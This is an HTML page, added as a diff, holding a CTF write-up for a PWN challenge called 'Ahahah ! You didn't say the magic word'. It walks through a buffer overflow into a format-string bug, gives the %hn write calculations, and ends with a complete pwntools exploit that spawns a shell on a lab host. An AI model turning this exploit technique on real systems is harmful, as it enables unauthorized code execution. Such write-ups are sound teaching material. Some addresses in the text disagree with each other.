@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>AMSI CTF 2025 - Ahahah ! You didn&#39;t say the magic word | F0ndueSav0yarde</title>
+<meta name="title" content="AMSI CTF 2025 - Ahahah ! You didn&#39;t say the magic word" />
+<meta name="description" content="Ahahah ! You didn&#39;t say the magic word " />
+<meta name="author" content="" />
+<meta name="keywords" content="" />
+
+
+
+
+
+
+  
+  <meta property="og:url" content="/blog/writeups/asmi_ctf_2025_ahahah_you_didnt_say_the_magic_word/">
+  <meta property="og:site_name" content="F0ndueSav0yarde">
+  <meta property="og:title" content="AMSI CTF 2025 - Ahahah ! You didn&#39;t say the magic word">
+  <meta property="og:description" content="Ahahah ! You didn&#39;t say the magic word">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2024-01-14T07:07:07+01:00">
+    <meta property="article:modified_time" content="2024-01-14T07:07:07+01:00">
+
+
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="AMSI CTF 2025 - Ahahah ! You didn&#39;t say the magic word">
+  <meta name="twitter:description" content="Ahahah ! You didn&#39;t say the magic word">
+
+
+  
+  
+  <meta itemprop="name" content="AMSI CTF 2025 - Ahahah ! You didn&#39;t say the magic word">
+  <meta itemprop="description" content="Ahahah ! You didn&#39;t say the magic word">
+  <meta itemprop="datePublished" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="dateModified" content="2024-01-14T07:07:07+01:00">
+  <meta itemprop="wordCount" content="383">
+
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  
+  <link href="/original.min.css" rel="stylesheet">
+
+  
+    
+    <link href="/syntax.min.css" rel="stylesheet">
+  
+
+  
+
+  
+</head>
+
+<body>
+  <header><a class="skip-link" href="#main-content">Skip to main content</a>
+
+<a href="/" class="title"><h1>F0ndueSav0yarde</h1></a>
+<nav>
+
+
+
+
+
+
+
+</nav>
+</header>
+  <main id="main-content">
+
+<h1>AMSI CTF 2025 - Ahahah ! You didn&#39;t say the magic word</h1>
+
+
+<content>
+  <p><strong>Category : PWN</strong></p>
+<h2 id="phreaks-2600">Phreaks 2600</h2>
+<p>You can find this writeup at <a href="https://phreaks2600.fr/blog/amsi-ctf-2025-magic-words/">Phreaks 2600 website</a></p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>This was a buffer overflow leading to a format string vuln.<br>
+We could leak data and do an arbitrary write because of reflected address in the leak, at position <code>%17$p</code>.</p>
+<h2 id="leak-return-address">Leak return address</h2>
+<p>It was possible to leak the return address by overflowing 256 bytes of data and then use a <strong>format string</strong> : in position <code>%2$p</code> we could leak a random stack address.</p>
+<p>This random stack address was 628 bytes away from a return address.</p>
+<h2 id="return-address-overwrite">Return address overwrite</h2>
+<p>Here is the strategy :</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">Stack elements</th>
+          <th style="text-align: center">Offset from EBP</th>
+          <th style="text-align: center">Overwrite value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">EBP</td>
+          <td style="text-align: center">0</td>
+          <td style="text-align: center">(unused)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Return address 1</td>
+          <td style="text-align: center">4</td>
+          <td style="text-align: center">system (<code>0x80507d0</code>)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Return address 2</td>
+          <td style="text-align: center">8</td>
+          <td style="text-align: center">(unused)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Argument	12</td>
+          <td style="text-align: center"><strong>“/bin/sh”</strong></td>
+          <td style="text-align: center">(<code>0x80ba34d</code>)</td>
+      </tr>
+  </tbody>
+</table>
+<p>We can do this in 4 writes of 2 bytes each (using <code>%hn</code> specifier) :</p>
+<ul>
+<li><code>&lt;stack_return_address_1&gt;</code> : <code>0x27d0</code> (2 less significant bytes of system)</li>
+<li><code>&lt;stack_return_address_1 + 2&gt;</code> : <code>0x0x0805</code> (2 most significant bytes of system)</li>
+<li><code>&lt;stack_return_address_1 + 8&gt;</code> : <code>0xa34d</code> (2 less significant bytes of <strong>“/bin/sh”</strong>)</li>
+<li><code>&lt;stack_return_address_1 + 10&gt;</code> : <code>0x080b</code> (2 most significant bytes of <strong>“/bin/sh”</strong>)</li>
+</ul>
+<h2 id="format-string-vuln-exploit">Format string vuln exploit</h2>
+<p>I used 252 bytes of overflow (instead of 256 bytes) before doing the format string vuln exploit (because 4 bytes have already been written because of <code>%2$p</code>). For some reason, we have to substract our bytes values by 12 bytes (because 12 bytes have already been written to stdout but i have no idea when). Here is the payload :</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">Stack position</th>
+          <th style="text-align: center">Total of bytes written (modulo 65535)</th>
+          <th style="text-align: center">Format string</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">return_address</td>
+          <td style="text-align: center"><code>0x27d0 - 12 = 10180</code></td>
+          <td style="text-align: center"><code>%10180c%17$hn</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">return_address + 2</td>
+          <td style="text-align: center"><code>(65536 - 10180) + 0x0805 - 12 = 57397</code></td>
+          <td style="text-align: center"><code>%57397c%18$hn</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">return_address + 8</td>
+          <td style="text-align: center"><code>(65536 - (10180 + 57397)) + 0xa34d - 12 = 39752</code></td>
+          <td style="text-align: center"><code>%39752c%19$hn</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">return_address + 10</td>
+          <td style="text-align: center"><code>65536 - (10180 + 57397 + 39752) % 65536 + 0x80b - 12 = 25790</code></td>
+          <td style="text-align: center"><code>%25790c%20$hn</code></td>
+      </tr>
+  </tbody>
+</table>
+<blockquote>
+<p>Do not blame me for these horrific calculations, i hate format strings even though this is super powerful.</p>
+</blockquote>
+<h2 id="exploit">Exploit</h2>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="mi">1</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;GRID_security_panel_cli&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;192.168.1.107&#34;</span><span class="p">,</span><span class="mi">8000</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># system @ 0x80527d0</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"># /bin/sh @ 0x80ba34d</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">256</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;%2$p&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">stack_retaddr_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mi">612</span> <span class="o">-</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_retaddr_leak</span><span class="p">))</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">stack_retaddr_leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_retaddr_leak</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_retaddr_leak</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_retaddr_leak</span> <span class="o">+</span> <span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">252</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%10180c</span><span class="s1">%17$hn</span><span class="si">%57397c</span><span class="s1">%18$hn</span><span class="si">%39752c</span><span class="s1">%19$hn</span><span class="si">%25790c</span><span class="s1">%20$hn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;quit&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><script>
+
+
+</script>
+
+<script>
+var all_codeblocks = document.getElementsByClassName("chroma")
+for(let i=0;i<all_codeblocks.length;i++)
+{
+    all_lines_of_a_codeblock = all_codeblocks[i].getElementsByClassName("line");
+    let start_number = -1;
+    start_number = parseInt(all_lines_of_a_codeblock[0].getElementsByTagName("span")[2].innerHTML,10);
+    all_lines_of_a_codeblock[0].style.display = "none";
+    for(let line=1;line<all_lines_of_a_codeblock.length;line++)
+    {
+        let max_len = Math.log10(String(all_lines_of_a_codeblock.length).length)
+        let current_len = Math.log10(String(start_number).length)
+        if(Math.ceil(max_len) - Math.ceil(current_len) > 0)
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = String(start_number) + "<span style='visibility:hidden;'>" + "0".repeat(Math.ceil(max_len) - Math.ceil(current_len)) + "</span>";
+        }
+        else
+        {
+            all_lines_of_a_codeblock[line].getElementsByTagName("span")[0].innerHTML = String(start_number);
+        }
+        start_number = start_number + 1;
+    }
+}
+</script>
+
+</content>
+<p>
+  
+</p>
+
+
+
+
+  </main>
+  <footer></footer>
+
+    
+</body>
+
+</html>
